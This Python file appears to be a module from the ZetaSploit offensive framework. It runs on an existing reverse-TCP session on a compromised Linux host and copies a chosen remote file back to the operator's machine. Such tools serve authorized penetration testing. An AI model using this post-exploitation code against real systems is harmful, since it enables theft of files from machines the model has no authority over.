#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.badges import badges
from core.parser import parser

from data.modules.exploit.linux.stager.membrane_reverse_tcp.core.session import session

class ZetaSploitModule:
    def __init__(self):
        self.badges = badges()
        self.parser = parser()
        
        self.session = session()

        self.details = {
            'Name': "post/linux/membrane/transfer/download",
            'Authors': [
                'enty8080'
            ],
            'Description': "Download remote file.",
            'Comments': [
                ''
            ]
        }

        self.options = {
            'LPATH': {
                'Description': "Local path.",
                'Value': "/tmp",
                'Required': True
            },
            'RPATH': {
                'Description': "Remote path.",
                'Value': None,
                'Required': True
            },
            'SESSION': {
                'Description': "Session to run on.",
                'Value': 0,
                'Required': True
            }
        }

    def run(self):
        lpath, rpath, session = self.parser.parse_options(self.options)
        exists, controller = self.session.get_session(session)
        if exists:
            controller.download(rpath, lpath)
